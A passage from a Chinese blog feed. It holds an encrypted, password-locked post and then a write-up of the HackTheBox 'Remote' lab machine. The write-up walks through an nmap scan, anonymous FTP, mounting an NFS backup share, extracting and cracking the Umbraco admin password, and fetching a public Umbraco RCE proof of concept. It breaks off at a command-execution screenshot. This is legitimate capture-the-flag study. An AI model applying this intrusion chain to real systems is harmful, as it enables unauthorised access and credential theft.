9d9f09e162cbee36b244379d3f388290195f75a8fd738b9bb5193707173f79f8177458ba1de82c96b7fe9008d858203d4d8af2d9ba2de01260961d27f9af05e633ef92bf47a4837c9676a5a98651fa052f023029b588698632d15a491e0dffa647820c1c5eb95988c4181fc1fec69a6f6f99a843dc2d886084124de92e272436d64895f43dce0b6953365812a58cf223395285e89f31e25005ac3636855f0ddb96a51ad521b660ecfe835cdf697961a3abde611544fca90ff9cf79c8e7d7dc6d7a10a2ce203e1aaad26b132d35452474df93d1fdfa05ef7182ff955b4c58655478bc1e1bc2264b5cae7c7dcbc94b7f09742d4aec8f79acdb3cd5d92511cb0a65f6bec9e5134ca8e9037b8a1b2025f9b2dd6d53ecf8e53c112a6e7cd91172cd52ecf7cdc6c6ae3bdc4a8252ff3936d5ad47d9bafd45d935ecb509e6efd5142b4bb331f13509ca11858e00c49e88682e757305b432e806fde54400c3d74fa5c631d267cc61ef355a063e20e1bd33e5cac5582c5ce9274f73e5ee11e056a6e64c95c901f1452564a0bcc164e7bc363b8a82504ffdbd43166ccce4cd03ec97072dc821b6c4bad3cbd6f667a17047a0ae7f61628197adfc0022d27c353255422c92b64af560e29e16129a474825a5c0ecd3f792cfd97b8cf10cc9df12e9af301edfa2dd8a73764dd91a258b23fe2651d6e3f731c2bdf059712e0d66b21eb12dacc4a802e6555c346b9139cd765ec94cf0557ae5a9dd4f4629565f5342a694f31588fcce29aebccdf14a7450f9250dd8174261c3efcfa0b8d01536dfa7f583d9d450ad49cb74eac990c7b0bb1e0fb609289cd8003757619232a6d12a3efeb6329f584d0fc49a46f1f6dffeae8c952053c6ceff119ab6551b6172a092b7c60a2d2d8d44e984f5f8ee60943192449c3fb66b754e682359f69b3206e4341b9d96a24ecd1be5226c8db8877e84bcf27c5bd1c80f195b03008f8cd7ec54776f94a044b8a3f1cb4d9a30ebcfb2ddd7d1f8ca4c2b08726b4da461ccb4ee62be857ce913e6ea22966c7f4bf4860da0f865db859ba749fd83a6b590f4eceaf62be624f8bf72805cbc40a601b1db56ef77d8997d9c1ed4ec6c6eb0f3b49acf171ab1f80254a4671c0aa826e560f490a2c539396e73e923cba09927924c688ab989efb0f6e097df9e4cd5d546b8c22ad50515b885ada25c273e7ecb5fbf6ef1444090dd8e1ebe83779e970aa21cc7423e3e2236991d7286367a14681cd167232e0d8b3b583daa5cc587dcaabcc3d0fcb0ddad48ece21da48a134f69139946c6839650b1840d8592031710bc70875d9e29c70da145980173adcffada1c4e00e86696560a8834c8ab1ae15c6bee1bfeb1733874fb34ab4aced9e978551ba8b699d26056afa47736ee67d11c07b86500fb403b20a17c036e27619c18da58b6bec8faaecf7e1b0adc9763719b30cfaf1ea41fd29c182cc0845560291d5a4922479f6e27d6036c8b412402f757354dcbebbbc80f263ef9266cd8189e5511594763c51dff7f2aa7b60d82aeed2703a5aaeb391a2935eeb398cce62e19cf3100d61d361821864255322b2814d797307f5e9d95cfe59a31b4212ed36a41fdd0b12e637b997f47dc5ffb806f61b6bee86acd157fc3946b63b63e1b90894ed38480a48c7ce9121ac6b3b7d4e5ecbf1b0b2411a1dc085cd4747e4de1c4e05861f229f1312aa4b00e177575ace465839d0290c666946b66cc3ebf2b0108fae3fc29511e5383588b29cf23d647492cd62192bba29f02d0796c200b02fd0b24f4fd0a599fd2ccc6a0e1d90ed18d7225187f22a2636221705c2621598d631740e276d973eec28b05eb3b81e07145570d724ac6794df105d03d0d4388807f753c719b6313bb2714e9377710a635f4a7a56857f2202f8c00133d9d1bb0cefd02d65f0f8ca32a2c01099cb7b24406c142706983dda7697a1fa4d0a734c6703aa752ed35acdc1335d1e9fd4d5e51b8bfe34852840117c8ba1c592ac50d8bd7a69bfbda84f96412e35c0bed6553b6a7887e2b3700b469315c056d7f2624a907f932e299061bd994bf2b57e2c16a59f670750249708745e5ab0ee415197c3f2e16681c710b54fde48b159772a70c23ac34a7b51eef4762850985c7d26e4eaa9ae16af2f3d945b9bfa98f1c39b9dbe9c54b4a070ae449546f9fac31416a50df810c380ef54b6051360b6361a0bdb09eb3a784b02895d857c6ce4464f94775e628a65a49c8b8d8f03df4932171159c3f3fc1d72ee6206f3c59b1f09e632f07d4c1a48644356ca87fcfea87dbb121f8f608f97c438930e37508dd35286c20063c0263d192c79e4126987deba1236e123648c3d58142a05134057ad5424f8296c96217e88a482c1beaa16eacf45ed7bb0ba9298e7e01d7ad0dffc49c83928c8817e83b947d75a5d813957432274572186ef3dfc96407c81ab8b04ce97e5a522e7dd2ca40f7e7ea901df9ce64b9ee915bfc9c679728fd57fcb5c0022b72ed089411243342a438601e7ecce996adf84fb020f05dbd3157f1c3a4c26187b449c64fd8d0703642b617635837252a7b65d199f69bb6714ea4d8b00daf25744d28897a4944c46f93349237011850102447bcef3b4326cd6f18ab1ec56ceaf4d8c5b294501a3f4497881082aa7f1d465df05ea7dd8186c52344d1ac2489967b6d9af2d7ffd57a8c560b4e9a8424e42ea719bab443a712d97121c20c3c40956b44f2f283e4cbca4d899493ebcb379cfdbdf8dac7c8054db8b12a82ec2ae189be0c63ff7cba812a266020658574d4ca413b06a44d5ff34d48aca7eb6e87b8609e5bc8efcd80a26165811526f78c037dc985731ccc97fd87a5533cafc1f287f7648d75054d78213da8d51e3af010c44b968744d1421d8fc69bd2b08f711a40c4d35398aaa574e2994cb4763622969802ab00f8a8d5203750dda9dd6b50d78a16b3607ec807743b4430b45116f1e669e4c52ca712ad0fa93e501b6d111936c0f4ffac10e0587455b9a9704d3c8fd5fd5d77f3a926fc3050c68cbd67dd8b8fb0f5568d7765224eac498d7c3dde051fc7fdc90556fd6d5d3674599c033e052521ee0f23c9ac9a1aa6ebbde34c896572ed27701401e98c71dba9e776bd16210cf470232755374267f9b098dc0f9d98fff70a10415c6fbac2c024c9e2e7fb08f1c5b11b13f495f4e14a174336d549c029dc042d2cd5946ffff5360d999868fa5c0be7b79681ff12864eee9dc21e875a82d0fd6c79bd8b368ac30213cdb8b293c34824e88b51d4d5290d6ad6e94a1d5c6abfe7a7c6393f7f28c99858925b5acb0ead47f3eb95d6de728507077919600c8e9740d751fb0d04e4da4b4083b17cf0889e29508d1e7c246a3b082cd0d02d10ee03e05532021ac23c2e728ab45e68b9bd983855f1bcfc316a5062a30593e1e35438a51befc471389b3879174a288f46414a070c1ae4d5ac02059cb09ff9820fbd713f9c564907ea1a626965cc98c54ec14238c714a22e1820f9285235158c3f2a47979473c8fead9ef93ff4af4cae0158ca240f320332478aa74a65cdc28dc964374b54ebb577f473ecd8f910438943e8c1b83bec6ca28d8d4d5b1d9d8e7decbc1c35f6787dec6eb4cfd4c079890c79b82572e618eed7dae4bdf75d563a7520134c8d6444272c552fee81e85c3eeeebb2b3f9ce76279b0a344c2d4fd5fc2b0afd7a894e8d1f8026fcf245a7429e7b2b28d7be6f3a1ebd3f49228edbd0726522b9608ae75390278e0fddda8c5b7d88cf6d701b663f9c91974774c90f2855cc3075a279280dc1bdb7291cdeefd26da13f52b8bb72920d764bc6cb8805e5fa47ac749c8c5fc37e9419d15d8c5bffeeef8b669e627ae77b4e76796ecf2c423b285095d3e829e554bd5bfb3a0108026d86fa7cf4fcee577128458e72243d27521dacbfce8080d26238460fe9ac927c9a2f274639d93afdad9c593cace76b0a00f3b75d9aad5352159309c54f6b2b3d81792518d2c6650cd4c0b2ff14fd689eceb0b7f514edc7f6b096e3db068cbbc7b4aae0e57f4ee38baec8312663bab914ed5be9bc0d9349fa6baeda308f5a73f2e3e25f6d07f974ac6356cfe90553386e58f78557c36a896b988ca8b34b77acf05a9dd2d9fc25be5889cb36ec923a3ad4beb95a8aee1e28b798849508099245184bd949300958dbebeb350b77f1d1d74b4067cbb1141841c6c563d35fc539908012ffe8b311c99b0d304874d39974b8b409c950b9a223f36a5c25afafb1d2e0da5cc8057ca55a0f759f231b6e30393b78f6a5d0793559ac1b8b30944ae1a549976255a9abdee1470bbb5de38e4292db3a6a55e7f0b891033dd2ecc089eef701ccb2fc71a1d689320b242c8416871729366ff6bf67b77f1ae8779e4f59e23a077d822f74029e72a44b4392518dbc62f06e34295ed63343f20d5bfc43ac6964245e286826bf54df1a0b1159f27519b61deca855200519a8506ad4373ec01c2908b3ff97ae1ec9f9b52aefc2d8fbf64a32f3b0cff5c0e227376e875b226402242a20d138afa833282c13297331ec1a2e6fb33e9eacc128cc98ddc9ad8541ffeec96a03c520a5fd1f65eff9e16f640b6de9d337ee6a10a0479db716c1b8883b0ebcc89a74522118c60c53eb7cba59aae37f5d7e4dbf8d93c05bc3061a8a6f393e7ea2fb6bead86fe42b0828a733aacd14c4e4d786e862b05c3dfdc2d5c89fda1f5c79bb4c71b585a0cba7e05e47d2d0ea9e6808ad2b2590338e20f585944a0d9de821fce157d8a9f7348503e32b2cbe5196a62a4645ae763a8b319396fda2d184c394a0ed16a9a931f594b744271463b45f687cc8acead015c4a06f40aec94471d6f01770f7b89490cc5e614be0a0d1b7e749b6d09d5c4dba9fa0889570a6a8977a8436666fb43ac870f007f0820434c41d2893ad12126305e2f5fd73efdf2f15152ff764232fd553153eb4eb552df742ceb1eb672b2845305655cea0e61ef0fed4b16d687310b1e39b47443e38978ffc9e2eba3dc71161d3213be2495dab3ff7cd83b1d1418d8783534626a6c9425cdc3272337583dbb8fd3bdb8a5a9608f0828a5030fa5cea566c398eeb973d8e604f9ae6d035473f26581cf6d3fc4f8c79ad7c57a8d6900ab0d3df4bd2975f0b1e348bbdf9906bdfbadadbafabac875be473a7d0cb8ec7adaa4c44d7268d3963fbdeae1894d76ec49f2c8a560049360e4219322bb0dd58fed4ecbbd2877b7e676f19997626b21fd9fde5b103fe346a4a9a4d2c82c9cd9c31d02bce47c8429a5c01c80d551b21053b30ebb9eef6de1b76d49878e16bcba8ce97a4fd896d7159780747dcb40443cd6a76da135a28716ba1af8ea62e179abfb18ec616c46a3cc2cdf3adc47f28727cb04b089a65e4d2be2c81a66f01dd9827c3b272d2c6925fa1200eb038302f04ad3eb970eb039fd5e5ef71a9b6125798ba9aa7c2ebeda9a12fc95e18056d4af83be27bdcd91f0f10ae4081f570ad6524bc27a0bb1478a27b1b5b211052771e28aee157dae26be94c591bf2ba39acfb20a80e4f74bf1a572ff2b1c3e433351d0e831c74649cd939a7e730ddf7b62eb3c987e766ae871890337fbc1c4fa38574162ccb2ea08b65a51b6f39831d34bd8b7a688b4ef3d02830b47df94cb3d0363267c1be38ed5de1e5aecef83f9bd107a44c4688d215a4ae5c2bf845988a7ef7b4bb074df0af2a31fecd969e1aad8f033e6b2a8733b5191a15f21821f5c1fc4325828984f653d78bee94a7c4d641ea0733d694ad899aa86af8d5abf1368682573ecbae863473d2bff545621d0ce7294956ff50801e5eab93343ed96c9f47b09e58b0c441c327adca7e788798e510507d5d10d83929477e759e08624e5843d5351971ce8e8427c7adc6adc6f6fa474fcbf05cb4db045367199c6ee2938ea533c2db4e569e4e2d9f7a66d082fde1f11d7c6bb9c6136a53658b3387c16d59d98a9efdaa00610e71e97c707ac4c4bfecd3a8d5e15bac8a0528dd8451cfc2b1fd2645ae3fd8f5c430d1317581a7717d2fcaf93cd67344ce8b8ff7e9dbc5b978cd166f381def83139ac7609d4a57b7f8c1cbf8077ce36f5d2b47e99f974f561cae75a0a5deacefd9f50e345c9ccb40680843adcc7c00e8db7846e424f8f7f95719a35a7c90dd71ccd2ab6f930dd7aff1b380c333ba28e2c6f63f8d46ae18948b91cf01e03860022b5233391242c228acce24be7205ccd5b26963a3760d9f55d7a61aba8c82fc3f67c57eeb628e3c7de0238b7111d7f55a855ab9e65a89c18a9706c45ba4b0201783dd61f132c757376241d0b114f74c6953ffce9eaa3577604b7d1969789757a0390bd96e963f5d58f2da02cc87078569f882efd849950f606f29baba02413311352f4a4ae21c38bdea74e99821912437418638f5389be70a328496d7f76a1aa1379db44861d3e8007f1812054fdc8c41426ab3947a38e28f39528983d6959a3a8497ada12d2ec07d4a36fb5d4d47297c3c06e2d4ea1efa6ca8618bd9bc95cc45e1140cde5c8203c015799fb942953d99cd85cbb44e52b5c586dc32ea46a224ed0aa65cb61f699972b01ee3ec4efee4092439110c1dd6f36f20363183fcc385821a809c32df4958998bc5e0d9e37bbb02ba6a9ffcd69257eebad84debf99ffbfea56d32f50baf33be6abee3ebc46f68bfcf80b2a11d8685ca331117e994a707effc7c7d4ff187b13ea4d677648a7963a5e4018316fe8d928b70cf3dc822960aa47fac64c54c16436c80cb0f70f0931a466feb3bdeb11dad8ef269aa7b772d682c73298fa3660d261ceee68523f482c1aa9674381d3d886ca123ff4d2f8bd40bd79afcec0c548782796351f2b3353962a85ca2a8d43fd273ab62350153df33535115c66bac798152d9088cc405e6eb856b790ddacf268443795f815341c98d7071314610e15db10b6d88d29b90f1af34f065f4e0440ad4b3a19f1a6ec39ec5c08a1b78d53aee2dadeef9bf31b46b1f2c7f6150ca21166cdebc6842403b94a4e194c858bbd8c8bf9e48866b2b2c7fa9aab9d9e295602616469915831117ca8442039f2d34a110096dabbd58cfabaf2b3a807d3b6c23a327e6ae5d05d6a08d407897008fa854aaf8e4e9e8dfa4383d8634fb4f32bd2ee756b01811d93fe4d3e56f7e0959ad8e42a56681c5ae7bb2a3a21fb2e864c77b111d0f0f49b407e315394147ac3ed9c5c4e0f3ebbf5c8ab047bea948ff5779b885b33c82c31f979776f148a4cba00ba644bcbd8267eb637db570f6aa32e12dac0a5946f9b181ee8929b96d4d539cc12065b4855c5c1e21ab09155e739aa768086f76a597445d21284872a08a414d554c0ab2a5d83ac16a0dc9e39f2c8ca1896ed0bab578c9458926a90f8275876a937289f3024261689bf3345f1dad35fe91ecb3cf0a7932c5b7e7aad783b077f189d431555fabcc3c2008281ae7826e002042b6126061d7f824654a7af4ae4b001d0cc7b3334c4f271a831abbe49e7eced942b945e8a5f8634ea28f0d4e439aa81f43f2463f8ed8b3458ddacf5442844ebc2bf03fbc91f1fbfcefb883709218c2bd46db8f6dd04a2c9f259caabeed79256c3e1e9750316b1b1c1cf32fa29df0727e84bc08c3a4903f66732aa62fb963e3e6ecdd3150c97212312d2227eb44636644d2c5f72ae48d3f7d6a9ec0f20e74d1f2645e1dc3afbc6f2b149e2a18b08dd819c5f2db0aed2db9fe3dc122e8e7a8b351d661660e79f8e592f656ce31da528887e4cee257057036455338dc20525dfd94405c547d1868e2e2cf8ec7e2c5206479560ffbabb5226ca27a7ef7f4df4fbafc514ff4215df39f59e79af7ff083eeda28b7a082912ee032ce1de4e474c01cb0209af4c03e5bf5d3accd962a1121ba2b0f85742de740ac9488786864b1f3345b12b3d998d496443b30c01f8f0456fa463b34ff151ff8e445dcba575eeb832595238208bfd80c8c67368f9fb44d8380731a2467d659ab99dc4d2a3cbd08a5963ab4f341eb010b76d4f788a136c7a736a18087be062423538e5bfabd1ce92984fdb9631858489609bebfb64eb21267eeb6f799312d62977790b2eb4fbeabe85e63664b05cfca0962918ecfa18672bcee4d4c4b65f20001264a6c17c35b53b8c3573a4b269010c2e5bee09be961e02ade3845f034cf26f3d2349f798e980a3d047e41d8ec53723d8f71ec243237ba0a78e927c1a4c428880936ad9cfb96b46df4a1b8197b7277d4d05bf660224520fa68e11fbb737ef9118cadec06fae282ab652a0117695d5e354c05ba20bcdead66bf4122842c8bdc00ba9f89399270001493cbeaaa489ebb73fd36c5192c7f7be44b4e5d346edbf2e45bf654e9cddaacc1d8983e1fe26fe4d57d82040c8931cf553f564b97fba673fc3c05379128a03467a2f98c832fd4334719c153afd8c347b71f02615b251a80b8e155ea3042aedb7e2c92e20816523a99d8190e6119bf569e59e5c618c0e31198a62496aa59d399b6b264fd085a54727575ba3a258cc5e24e652c8e5180cec2d3c4ec24f986f0fc99f6ac07ca975803b1aeb59de117296ee79550096d3c384a865cbb8a296a0ac2504b2ecf2a4556a6de1da109eabd0f673c1fd30789e74df9c950efc03b06f3dcbdd9c6d74bf086bc62697ab7724d547deb77c6a4fe78c3d300868f304c248828be00771da5aa9dfc6f423a3d1d6f54a56ab7480b3a07df6812d08b95f6c620267b36d486d1564c497e06ed69e0d929a677d1508cc928e23368d44f0a0bd14fcd5f0a8244a89e05c1fe00ee9fb5629531917cb0b04409a36eea74e68b750957fd16e40ac2679bbb4ac7369d8c94e5ef09ae466faac58ec8cd53d623909b6215ad6ac0a55ee78137aa086623b745c3a762ece3249200fe43866a5a5d4fa5858e21650ea03ccd31e9116137d9b18fc950d823e6bbb1e1d7561484fec2fda506c4380584bb82d0fc60e30c72a261fe7caefceca2ded7b935725120b93633545510d2928b2124c7e59d47b1d8d5abeb60405d0f2d985ab0f4f085c4d1f1eb2f0de33c8fcc9be24035e9ddcd7a6f18b6fb56f5f8951ae5e08994efb7795ae0d703b13e31a0ea56e4b2fe96a7f8498bed323ac5bdd9c65819cec6fcbcd0503e424631ba706511602785189902d1158aadfb26ecbb74cd72c66811885af0f39c9199337ec89fbaaa49b3f798de9428342d51724a8b262ba903917b2b0574820bd6bb928621603be4e00991693e2a3c8c7af99c76193a153381715d14e70e6a33a04da8955fdbbc9ee7bc7415d9342bf233ea174e334e05a1a16f861a746b6e8cc5bf4d3b88daa32babfbabae0faa70ba81d5af7dd46027d039d7c075c5a5cca7bb1bc5ccb0dd15894654d63ba8a68fe6eafb9fe53ede583175c2d9a6b5ff52eb1ecaad2507c6ec3d7621b878e86ef5ab79d01f9a972c2abb2dc28d320e940d2ffdfab5611a913d02af98d5870daa6448088d9693aa1f2d12b2c71dc359aba596161019d656c56806cfb19b4f4a4e4fe981feac5693094c5cc9fac4452b7849ab752724d50845d2c37ff2cecfd0aea0ce431c80b934ee0c2b0a217dd2d00e6b48ed3ca90c2dffe991af067d8aa93ba451ce07d8c3a2d57d96763c5dcc1b421e3ec542373eba78d6fc9312080f1cbf37954aee9aac6bd627a20464b10a49acf3c34c804d48cf395a45b15e34f7ef05dba811607ff1bc411de6f6545dc718f739afb7e34529c1bba7da48329e9ba503d779260c222d513a404520829acae6d1d4f870c76e3647f5c9365b522636f553ce483be2cee14e953968eddb3c8e17e82e534b23df1733efa487ab5df2e1012dd07c06144f5c938e465f56dbed8b76d06169172cc05f3ab95356046f65626ee076863c9f13ecae7454527f5292f5b50550d5039580f8e4c3edcbe33661ca62c2f95db7dc077fd226a2df48e7398b04d5f47344ec036441e950f358373267d98d4df59adeaa669dc94a01bea773b1267b889cd9926794d5864388d41e77829b724e4348f72feffe5dfd3e4386719a8e19f7200464438e3ecc3258b2a9724748baffd07727d57d22d200c93f8a92f322536ef54c67246866bf7e19e0fde7b7f85b02753ad124d5badb81e35d7917bb7213b02c916005a2f134d6dfc27b803b011286b61d09f8ba2737605c287b348f8aadfd32f00faaf58604895ce96107a57683db3ce5aae93356b535cd87614d8747ab010d6b69d6fe33631d45fa54dfa63ce8b5c94fff76c9a49a253a8c3c3d567810aed0b319e2b0ef38ffad5320c8079c0f40f888acc027409cc0287274dc2e366be4deb6d7926897af5d349091c628f89f3608d28a8d7b6736ff9bf96af6ef44c1a0d03f10137b5fd637b8f21a7c36310a5d4b2c4127e3b5cb810f99f31eece0e27a5998eb6bcba1c30df2b90851aa3051ef9df49af5d2bb42136badcf8df9ab54ad4525734852db17b072b0e1571f988d3377f6953615b87584ca2b18feb8543e2a3973c7078bdeb0e4c0f866836f302f8be69b2798cbd1821b096cff18c1d91aefc8fb1ab4f979de3eb90262de736b2009ccef325dcb6a7661f946b7f9983cd01492905ebddb4e00298ce8476604922b49a3ffb908026b11a4ffb78756c4e298f76ccef692b8816124acb2761fac399fb6374e2e4ea0995566c19c7cf013395e4fd5681a9da8ab53db87ee66ead93a06594f5c891851f73998f50513e68790397a1f74bd8bb75f9e0b21bbd2a26d3827d24a4331c3443af584c72e31b0bd7e1a4972cf9fd5c8b4383e79ead674500598110ed8743cf25e77cc8cd7c51507a8d23c924a8efcb04b7fd34ea7e01cb54636835bf574a7dbf551d8eb44763b572913090956ba60adf5de0d8b4d7279db9a5a79340e85f3e00c720735b8983e2b1dcbcae5f210aa021903c99432f7f1bb8b99a843503daa6b3f03212dc7494069fb843f71defaadad6694c41008cfabefc2dbdd271f81ee43f84e942d4af261ebf18364d16cd92d66c8c8f5ca237af4e81e93db17c254fb2dbe7de7d72dc679d583f93b310b428b9d5a3e568dbda98ecf148a3ab9af7bc84120d8250e4010df425be405e44dcc0fb1bdbea2095330f6a10614738239eb4c3efc45d2287e44b28b21105d63648a25eed9e4a77cb80b299917095650a725e2d760b09f1af5c4de9060124bdf9b04bcfba2a95c4c012e9ef7bacd7363ce5caf5313b39541bb39510d7ee26e4cdd3503ed1739b06791df9f4e1d8b5347b8a7bcd6dbebf9d4d7c0414e2cdb7c84eca81f0f60f448b4cc95307dc15e3964f5db0598c8aea0effe84b33d3d0a16e14211f5d226fde9727c189aa80bf7e2dc2b61af4dbd185ba3523aa639d2b7c17b48af68873992f5ed4c499671f81a1a20e48e30d1b6f9c87de43a02be79da852524a58d57f07765f860ef1bc58d035996afee0e20151057f1145afed8184c70a3b3a5f04f551a4e2584e3b0591a50f49e38a6c91bcd60abccdd2ac128386cbbd551ddbd82ea4c7ce6fd734ec1daa6fdb8baeee212024d0cb3ab07f0b4e7252bbecf470fa5b5aa5c5170f61fad4d4608a6a8bd3f34377a78d7e7255d62cee3b19da7531a9a49eb239d9740deedab9d64c9282ef2d716b7f33fe4306c2f459efbbf27156036aaf806436626d1aae48fb7ce825f5f053b6a0aca71470c59300d360c7942688269fbf554b15281478ac12239cb90dd18b9da14c9f3082aadb67eaf839d65f08aa5b6a0c8edf60850c43f55fb807914671cd548e7f34a0d0f8e702f71306b7fde78573f1b0a28fcb51dadd5b95d0d22ead5ea97596a51310c93aea2cefb8febce264f4b34cad014d6fd3968bfb8f0c418c27a80a25ac9a35fcba8e0fca4cbaeed971957b063a9fc225f8769649d2d20ddde385d88fefbf742309f6cc22c213309272a6ace9aee5e21bfa4de5a7dbdfdc0f03c51f46cc607386b790f12c3f921c0c68ade2981b914b5674d93848f5a4c263c5bcc0d39b7143b3ce92147e20457b76757bff1926d76155298e75b86d6cbae055094eec38c624e09b7b5ad16a91aa10b14236fb5ec90d5473a5623ec179221f5af326d9c979081b7291544be8160db6654de8da2ace1cbdea2df5417ef594020e89d5d6a961dd0e641fc2fd613f4d17ba683d02c142bd908cce6c340eafecee76df42db1e62521be52b86c8a83d5953440753b3fbd8a7b47f0c20812c130a177665a9523b9f551ed6bf6967f52122ce991f7fae3ce18ed17d007e0ea2ac8ac0b615a09710293050de1b0d393e1857cca5b2b7449e8dd584438310dc3e8c4233c04a476686d439f0ed84bdaa70aaefc0c16cb13ca0868dbdaa65f9aed3dff0ed3624fc8ec900f7fb902094cc447fa1ae0753be4785087cebfd1bebac3c0bf85b30bcbbaaa9676e4cad8f0db0e82c2be0f5185498ed0d2640d935513ed0b00899392bff5c49ff7cab91f5a1fd0d315fd087a57ab5bb5429390e61ff097731b8990253c591afc0fac3922b675c465fd0cfd4923bab58bdafd510ef3578fb27aa32b18e63c48888e6cc50e849a6975f0e0c2e34b2b4a695858a76c6f268bfda6ddaebe305608320e6430f80640f03b9803b62b84abae2e2ecc256ee378a2c0d4d4d17890b3e32dc4d4d426dd17f678b9cd4f901410169d0d65469e5761e7aa2edebabde6a3d6e95a2e190ae0bc543c00f7637da652b6dfce9cc5c39f1f3e80b4c2ae7b186005eb0e6d5f22dbb9797cecd7237b982a8641d0f17b3eddc7b7e63758a537ce7fe40bb8ae925290e425b22a4f56e97f69368450e9d38d7a4a8e7e99ea6b28c123dcf24fa4286984eb59bee7f8bdc54b710876f18ccf8b312fcd08f92b8f166e59af8a124a8499633f1ba4d5ff9c223fe0dbad6a64585179dc766c795f0a6a4c4568c5f038345320c8fe513d35e0c8dc57819533018b24ddce3fb9060dc7d3fa85bcb3ee505c7c3426cf78003d24e7d0b21d7edc8e8f6a30763f6f5e3bca31d3b937a44474fb48ee3f69fccbf0043a934551ec51c29ae0a58c428f82aa88897e478263cfabe1556fa99a2891f8bb9eb486254544ea1a300549993d747f0a52322b4c00b05f9c508d0546a287ab740025a8bf20fc3404bad0cf8877f84a34f4800a64cbbaa9276ceea85ae77ca62639cf3d6ce63941867a9808078db8edd28a7e9335254c06e95a822013fae7cbfccb792ec8bdef422e42502face97fdd780f89fd3d89413a6c4e789d19b1d594c294907bd3652c04dc8ab8a201cdd9d15543b7dc71d3d5e77e322c9e28056aa725ad56e1c458f962cc8d0d91fa8db636ea5970cc88356d449d3b406f8136305cf8f42973928d49bb0225a388427be7bb7091959a5dafa56ac6d62ec14ae3e2047e40d063d03cc84c8c6aa0d0188333b06a84b76e591bacef4</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>htb remote复盘</title>
    <url>/2024/04/08/htb-remote%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>为了学windows渗透相关内容，昨天冲动了一把买了htb一个月的会员，为了不浪费这一百块钱，接下来要好好学！</p>
<p>先做的第一个就是remote靶机，全程看着wp做的，相比linux，很多东西都是陌生的，还是要多做多复盘才能熟悉这个体系，让知识深入我心。</p>
<h5 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h5><p>官方wp</p>
<p><a class="link"   href="https://cn-sec.com/archives/1330676.html" >https://cn-sec.com/archives/1330676.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/zongdeiqianxing/p/13568447.html" >https://www.cnblogs.com/zongdeiqianxing/p/13568447.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://segmentfault.com/a/1190000041183119#item-1" >https://segmentfault.com/a/1190000041183119#item-1<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Remote" >https://app.hackthebox.com/machines/Remote<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>ip：10.10.10.180</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- --min-rate=1000 -T4 10.10.10.180</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161050.png" ></p>
<p>一个一个看，开了21端口，用anonymous登陆</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161925.png" ></p>
<p>没有什么可以利用的，切换到下一个端口</p>
<p>来到80端口，是个http服务，wappalyzer识别出是Umbraco的CMS</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.21.27.png" ></p>
<p>然后找到一个登陆点</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.25.57.png"   style="zoom:25%;" >

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408162724.png"   style="zoom:50%;" >

<p>发现需要email，扫目录也没扫出什么，再看看其他端口,2049端口有nfs服务，showmount看看有什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408163102.png" ></p>
<p><code>showmount -e</code> 是 NFS 命令的一部分，用于显示远程 NFS 服务器上共享的目录列表。</p>
<p>有个目录，把它给挂载出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -t nfs 10.10.10.180:/site_backups ./nfs -o nolock</span><br></pre></td></tr></table></figure>

<p><code>-t nfs</code>: 指定要挂载的文件系统类型为 NFS。</p>
<p><code>-o nolock</code>: 使用 <code>nolock</code> 选项表示禁用文件锁定机制。在某些情况下，NFS 文件系统可能会默认启用文件锁定，但是使用 <code>nolock</code> 选项可以禁用它。</p>
<p>官方给了个提示 <a class="link"   href="https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials" >这个链接<i class="fas fa-external-link-alt"></i></a>说了UmbracoCMS的密码凭据存放处，是Umbraco.sdf，在App_Data文件夹里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings Umbraco.sdf|grep admin@</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164414.png" ></p>
<p>找到了一串md5，用网站解密，解出来一串是密码</p>
<p> <img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164510.png" ></p>
<p>拿着账号密码登陆刚刚的登陆框</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin@htb.local:baconandcheese</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164719.png" ></p>
<p>成功登陆后看到这个CMS的版本是7.12.4，在网上能找到相关的RCE漏洞</p>
<p>poc：<a class="link"   href="https://github.com/noraj/Umbraco-RCE.git" >https://github.com/noraj/Umbraco-RCE.git<i class="fas fa-external-link-alt"></i></a></p>
<p>下载下来后尝试命令执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164903.png" ></p>
